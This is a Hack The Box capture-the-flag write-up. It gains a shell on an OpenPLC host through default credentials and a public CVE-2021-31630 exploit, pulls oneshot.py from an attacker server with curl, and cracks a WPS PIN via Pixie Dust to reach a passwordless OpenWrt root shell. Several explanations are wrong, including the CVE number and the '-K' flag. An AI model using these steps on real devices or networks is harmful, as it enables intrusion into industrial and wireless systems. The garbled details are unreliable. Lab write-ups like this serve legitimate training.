#HacktheBox 

Starting with Nmap to scan for open ports:

```bash
nmap -sT -Pn -p- --min-rate 10000 10.10.11.7 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 10:24 EDT
Warning: 10.10.11.7 giving up on port because retransmission cap hit (10).
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 44.12% done; ETC: 10:26 (0:00:53 remaining)
Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 82.92% done; ETC: 10:26 (0:00:18 remaining)
Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.99% done; ETC: 10:26 (0:00:00 remaining)
Nmap scan report for 10.10.11.7
Host is up (0.15s latency).
Not shown: 61010 filtered tcp ports (no-response), 4523 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 106.68 seconds
```

Here  after that i add it in my host file and open port 8080:

Here this is a openplc login page and here i try default id pass openplc:openplc and it worked:
Now I searched online for vulnerabilities of openplc, which I could use. I noticed CVE-2021–49803.

here i found a git hub exploit for this : [CVE-2021-31630-HTB/exploit.py at main · Hunt3r0x/CVE-2021-31630-HTB (github.com)](https://github.com/Hunt3r0x/CVE-2021-31630-HTB/blob/main/exploit.py)

and i run that and boom i get shell:

![](images/Pasted%20image%2020240616202541.png)

Here i was surprised that how can  i get root so easily then i see that its a user flag:

Here i check the running process and i find something strange:

```bash
root@attica01:~# ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2  17804 10604 ?        Ss   14:23   0:00 /sbin/init
root         125  0.1  0.7  64056 28244 ?        S<s  14:23   0:03 /lib/systemd/systemd-journald
systemd+     152  0.0  0.2  16112  8028 ?        Ss   14:23   0:00 /lib/systemd/systemd-networkd
systemd+     158  0.0  0.3  25524 12492 ?        Ss   14:23   0:00 /lib/systemd/systemd-resolved
root         160  0.0  0.0   9484  1240 ?        Ss   14:23   0:00 /usr/sbin/cron -f -P
message+     161  0.0  0.1   8540  4748 ?        Ss   14:23   0:00 @dbus-daemon --system --address=systemd: --nofork
root         163  0.0  0.4  34288 18828 ?        Ss   14:23   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --r
syslog       164  0.0  0.1 222392  4980 ?        Ssl  14:23   0:01 /usr/sbin/rsyslogd -n -iNONE
root         165  0.0  0.1  14896  6368 ?        Ss   14:23   0:00 /lib/systemd/systemd-logind
root         166  0.0  0.1  16488  5804 ?        Ss   14:23   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root         171  0.0  0.0   9960  3448 ?        Ss   14:23   0:00 /bin/bash /opt/PLC/OpenPLC_v3/start_openplc.sh
root         180  0.0  0.0   8388  1152 pts/0    Ss+  14:23   0:00 /sbin/agetty -o -p -- \u --noclear --keep-baud co
root         181  2.6  0.8 531968 33776 ?        Sl   14:23   0:51 python2.7 webserver.py
root       12373  0.0  0.0   9960  3428 ?        S    14:48   0:00 bash
root       12377  0.0  0.0   8376  1104 ?        S    14:49   0:00 script /dev/null -qc /bin/bash
root       12378  0.0  0.0   2880   964 pts/5    Ss   14:49   0:00 sh -c /bin/bash
root       12379  0.0  0.1  10224  4332 pts/5    S    14:49   0:00 /bin/bash
root       12402  0.0  0.0  12660  3460 pts/5    R+   14:56   0:00 ps aux

```

Here by seeing the box name i know it must related to wifi:

```bash
ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.3.2  netmask 255.255.255.0  broadcast 10.0.3.255
        inet6 fe80::216:3eff:fefc:910c  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:fc:91:0c  txqueuelen 1000  (Ethernet)
        RX packets 159136  bytes 15686629 (15.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 143657  bytes 18999219 (18.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 272  bytes 17387 (17.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 272  bytes 17387 (17.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

`iw dev wlan0 scan`, the output will typically display a list of detected wireless networks in your vicinity.

```bash
root@attica01: iw dev wlan0 scan
iw dev wlan0 scan
BSS 02:00:00:00:01:00(on wlan0)
        last seen: 343.704s [boottime]
        TSF: 1718551780153963 usec (19890d, 15:29:40)
        freq: 2412
        beacon interval: 100 TUs
        capability: ESS Privacy ShortSlotTime (0x0411)
        signal: -30.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: plcrouter
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
        DS Parameter set: channel 1
        ERP: Barker_Preamble_Mode
        Extended supported rates: 24.0 36.0 48.0 54.0 
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Supported operating classes:
                 * current operating class: 81
        Extended capabilities:
                 * Extended Channel Switching
                 * SSID List
                 * Operating Mode Notification
        WPS:     * Version: 1.0
                 * Wi-Fi Protected Setup State: 2 (Configured)
                 * Response Type: 3 (AP)
                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
                 * Manufacturer:  
                 * Model:  
                 * Model Number:  
                 * Serial Number:  
                 * Primary Device Type: 0-00000000-0
                 * Device name:  
                 * Config methods: Label, Display, Keypad
                 * Version2: 2.0

```
The RSN version is 1.0, the Group cipher is CCMP, Pairwise ciphers is also CCMP and the authentication suite is PSK. All this things are strong indicator of that the whole thing is vulnerable to a pixie dust attack.

Pixe dust attack - This is an offline attack and affects only a few chip makers, including Ralink, Realtek, and Broadcom. Pixie Dust works by helping hackers gain access to the passwords on wireless routers. Basically the tool is very straightforward and can gain access to a device in seconds or hours depending on the complexity of the chosen or generated WPS PIN.

Oneshot is one way to exploit this vulnerability. [For this I used the oneshot.py script from kimocoder](https://github.com/kimocoder/OneShot).

Here i transfer the script:

```bash
root@attica01:/tmp# curl -O http://10.10.16.4:8000/oneshot.py
curl -O http://10.10.16.4:8000/oneshot.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 53267  100 53267    0     0  35221      0  0:00:01  0:00:01 --:--:-- 35206
root@attica01:/tmp# ls
ls
oneshot.py

```

```bash
$- python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K

python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
[*] Running wpa_supplicant…
[*] Running wpa_supplicant…
[*] Trying PIN '12345670'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response…
[*] Received WPS Message M1
[P] E-Nonce: DE285D67185252704E05F9B66A2689EA
[*] Sending WPS Message M2…
[P] PKR: 7F6E074ED26C96AA8D82440BB5AFD0E5E88B74159D11E663BD9120829676A67038B732C3F4C27F68A2E70796F27F982B568B308EFE7DEB380CA23EE96BF65E6082C83AEFCABBA2DBD65DFDAA04C6053A9795F52610B7D6FAECB8683331318EB02D0311C9C5C5B9B5FB3BE51A1F322FD86847963E2269A5252748B730A6C74C4828E524E58DFB541D17960003CDE3E9B186DC992BA9B901F4BBDD0CB54707B8CB004C5A8A6012DC87531DE207603B89CB4B4577CA40CB2B301FE3727ED9AEEBCD
[P] PKE: 7F6F8ECD1B8BA5A28F77C36E721BCAAB9353D3AF33C67F7A204915BEC7C6293D4E9FBB3472906D5CEF40E527B8B05D8719984497867AFA9437926770F43FD5F5FA255B766E7D2855E86881F190474F3B6D7DD0102C268E3345FD24827DC1D8AFC14512AD6E397F6BCC3D1A2A3B7ED850966B56C07EAF989E31F9E003D82F39C9C5D81C49B074348ACFEAF8A298B314C208F71A8A82D6EA0020E0423FB36B907839A3F8EEBDC130460C6C8F62E7FBF0990B50CD5B6705EF02AC8278C77B512490
[P] AuthKey: 6AC35A5A68D2632FD221FD5855413E2D9950196D6CF37A96D319DE214A82F68C
[*] Received WPS Message M3
[P] E-Hash1: D518887E4BFA1B6FD2F7B185A9060D2AC95E56F314DAEB82655514CE42C9F307
[P] E-Hash2: C1A5AE7B5FF9791A48D95A5603FAC1B7A1A14D2CFCDFD57E2F7145178CFBC884
[*] Sending WPS Message M4…
[*] Received WPS Message M5
[+] The first half of the PIN is valid
[*] Sending WPS Message M6…
[*] Received WPS Message M7
[+] WPS PIN: '12345670'
[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
[+] AP SSID: 'plcrouter'
root@attica01:/tmp# 

```

By running oneshot.py, I obtained the WPA PSK (Wi-Fi Protected Access Pre-Shared Key). This PSK is used to authenticate and encrypt the WLAN network “plcrouter”.

- `oneshot.py`: This is the name of the Python script used to perform the attack.
- `-i wlan0`: Specifies the network interface to be used for the attack.
- `-b 02:00:00:00:01:00`: Indicates the BSSID (Basic Service Set Identifier) of the target WLAN. The BSSID is the unique MAC address of the Access Point (AP) you wish to communicate with.
- `-K`: This option specifies that the attack should be performed using the KoreK method. The KoreK method is an attack technique used for decrypting WEP-encrypted WLAN traffic. It's an outdated encryption method and is no longer used in modern WLANs due to its insecurity.

With the next command, I generate a passphrase for a WLAN network and write it to a configuration file.

- `wpa_passphrase`: This is a command-line utility used to generate a WPA PSK configuration entry based on the SSID and passphrase provided.
- `plcrouter`: This is the SSID (Service Set Identifier) of the wireless network for which you want to generate the WPA PSK configuration.
- `'NoWWEDoKnowWhaTisReal123!'`: This is the passphrase used to secure the wireless network. Make sure to enclose it in single quotes to handle special characters properly.
- `> config`: This part of the command redirects the output generated by `wpa_passphrase` to a file named "config". The ">" operator is used for output redirection, and it creates the "config" file with the generated configuration entry.


```bash
wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config

wpa_supplicant -B -c config -i wlan0

wpa_supplicant -B -c config -i wlan0
wpa_supplicant -B -c config -i wlan0
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information

ifconfig wlan0 192.168.1.5 netmask 255.255.255.0

```

The command `ifconfig wlan0 192.168.1.5 netmask 255.255.255.0` assigns the IP address "192.168.1.5" with the netmask "255.255.255.0" to the network interface "wlan0".

```bash
root@attica01:~# ifconfig wlan0 192.168.1.5 netmask 255.255.255.0
ifconfig wlan0 192.168.1.5 netmask 255.255.255.0

```

```bash
root@attica01:~# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.3.2  netmask 255.255.255.0  broadcast 10.0.3.255
        inet6 fe80::216:3eff:fefc:910c  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:fc:91:0c  txqueuelen 1000  (Ethernet)
        RX packets 991  bytes 137306 (137.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 469  bytes 117663 (117.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5  bytes 288 (288.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 288 (288.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.5  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:200  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 12  bytes 2164 (2.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19  bytes 2996 (2.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


```

I then established an SSH connection to the device with the IP address 192.168.1.1. This is the IP address of the device in the WLAN network “plcrouter”. Once the connection was established, I was able to access the device and execute commands as the root user. 
 
```bash
ssh root@192.168.1.5
ssh root@192.168.1.5
ssh: connect to host 192.168.1.5 port 22: Connection refused

root@attica01:/tmp# ssh root@192.168.1.1
ssh root@192.168.1.1
The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.
ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Warning: Permanently added '192.168.1.1' (ED25519) to the list of known hosts.


BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.2, r23630-842932a63d
 -----------------------------------------------------
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
root@ap:~# id
id
uid=0(root) gid=0(root)
root@ap:~# ls
ls
root.txt
root@ap:~# cat root.txt
cat root.txt
240773d1649cd4d7ae3f01155647eb97

```
